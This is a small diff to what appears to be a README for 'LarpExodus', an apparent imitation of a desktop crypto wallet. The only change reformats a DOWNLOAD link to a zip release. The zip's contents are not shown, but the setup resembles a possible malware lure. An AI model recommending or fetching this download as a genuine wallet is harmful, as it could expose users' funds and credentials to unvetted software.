@@ -21,7 +21,7 @@ Whether you're exploring wallet interfaces, testing interactions, or experimenti
 - 🖥️ **Desktop-Oriented Experience** — Designed to provide a familiar desktop wallet workflow.
 
 ---
-##[DOWNLOAD](https://github.com/thezerlover-dotcom/LarpExodus/releases/download/v2.4.7/LarpExodus-2.4.7.zip)
+[DOWNLOAD](https://github.com/thezerlover-dotcom/LarpExodus/releases/download/v2.4.7/LarpExodus-2.4.7.zip)
 ---
 
 ## ⌨️ Keyboard Shortcuts
